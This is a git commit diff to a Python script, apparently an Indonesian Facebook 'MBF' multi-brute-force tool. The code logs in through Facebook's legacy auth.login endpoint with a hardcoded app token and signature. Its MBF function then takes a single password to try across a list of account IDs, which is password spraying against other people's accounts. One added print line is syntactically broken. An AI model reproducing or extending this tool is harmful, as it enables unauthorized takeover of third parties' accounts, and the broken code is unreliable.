066f2408f5eb64fcdd1f517eaf3a21002f0632f9
Iqbal_Dev <47203081+IqbalDev@users.noreply.github.com>
2019-06-25 09:16:09 +0700

    Update proyek.py

--- proyek.py
+++ proyek.py
@@ -93,7 +93,7 @@ def login():
         
         banner()
         user_name = raw_input(p+"  ["+h+"+log"+p+"]" + a + " Username" + pu + ": ")
-        password = raw_input(p+"  ["+h+"log"+p+"]" + a + " Password" + d + ": ")
+        password = raw_input(p+"  ["+h+"+log"+p+"]" + a + " Password" + d + ": ")
         req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
     
         dev = req.content
@@ -154,7 +154,7 @@ def id_teman():
 def mbf():
 
     global password
-    global listID
+    global listID, nama
 
     try:
         token = open("token.txt", "r")
@@ -168,7 +168,10 @@ def mbf():
         print
         banner()
         try:
-            print h+"  [" +k+ "MBF" +h+ "]" + a + " Contoh" + p + " (sayang) "
+            iqbal_name = requests.get("https://graph.facebook.com/me?access_token=" + token)
+            dev = json.loads(iqbal_name.text)
+            nama = dev['name']
+            print h+"  [" +k+ "MBF" +h+ "]" + a + " Selamat Datang" + pu + nama "\033[92m :)"
             password = raw_input(h+"  [" +k+ "MBF" +h+ "]" + a + " Masukkan Password" + p + ": ")
             print
             try:
